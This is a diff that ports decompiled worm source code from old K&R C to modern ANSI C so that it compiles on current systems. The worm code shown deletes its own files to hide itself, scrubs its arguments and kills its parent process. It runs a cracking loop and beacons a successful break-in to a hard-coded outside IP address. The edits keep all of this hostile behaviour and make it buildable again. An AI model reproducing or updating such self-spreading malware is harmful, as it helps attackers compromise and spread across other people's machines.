@@ -14,24 +14,24 @@
 #include <netinet/in.h>
 #include <net/if.h>
 #include <arpa/inet.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
 
-extern errno;
-extern char *malloc();
+extern int errno;
 
 int pleasequit;					/* See worm.h */
 int nobjects = 0;
-int nextw;
+extern int nextw;
 char *null_auth;
 
 object objects[69];				/* Don't know how many... */
 
-object *getobjectbyname();
+static void mainloop();
+static void report_breakin(int arg1, int arg2);
 
-char *XS();
-
-main(argc, argv)		/* 0x20a0 */
-     int argc;
-     char **argv;
+int main(int argc, char *argv[])
 {
     int i, l8, pid_arg, j, cur_arg, unused;
     long key;			/* -28(fp) */
@@ -67,24 +67,23 @@ main(argc, argv)		/* 0x20a0 */
 	    close(i);
 	unlink(argv[0]);
 	unlink(XS("sh"));			/* <env+63> */
-	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb"
- */
+	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb" */
     }
     
     for (i = 1; i < argc; i++)
-	for (j = 0;	argv[i][j]; j++)
+	for (j = 0; argv[i][j]; j++)
 	    argv[i][j] = '\0';
     if (if_init() == 0)
 	exit(1);
     if (pid_arg) {					/* main+600 */
-	if (pid_arg == getpgrp(getpid()))
-	    setpgrp(getpid(), getpid());
+	if (pid_arg == getpgid(getpid()))
+	    setpgid(getpid(), getpid());
 	kill(pid_arg, 9);
     }
     mainloop();
 }
 
-static mainloop()				/* 0x2302 */
+static void mainloop()				/* 0x2302 */
 {
     long key, time1, time0;
     
@@ -94,7 +93,7 @@ static mainloop()				/* 0x2302 */
     if (hg() == 0 && hl() == 0)
 	ha();
     checkother();
-    report_breakin();
+    report_breakin(0, 0);
     cracksome();
     other_sleep(30);
     while (1) {
@@ -114,11 +113,10 @@ static mainloop()				/* 0x2302 */
     }
 }
 
-static trans_cnt;
+static int trans_cnt;
 static char trans_buf[NCARGS];
 
-char *XS(str1)			/* 0x23fc */
-     char *str1;
+char *XS(char *str1)			/* 0x23fc */
 {
     int i, len;
     char *newstr;
@@ -139,8 +137,7 @@ char *XS(str1)			/* 0x23fc */
 
 /* This report a sucessful breakin by sending a single byte to "128.32.137.13"
  * (whoever that is). */
-
-static report_breakin(arg1, arg2)		/* 0x2494 */
+static void report_breakin(int arg1, int arg2)		/* 0x2494 */
 {
     int s;
     struct sockaddr_in sin;
@@ -158,7 +155,7 @@ static report_breakin(arg1, arg2)		/* 0x2494 */
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
 	return;
-    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
+    if (sendto(s, &msg, 1, 0, (struct sockaddr *)&sin, sizeof(sin)))
 	;
     close(s);
 }
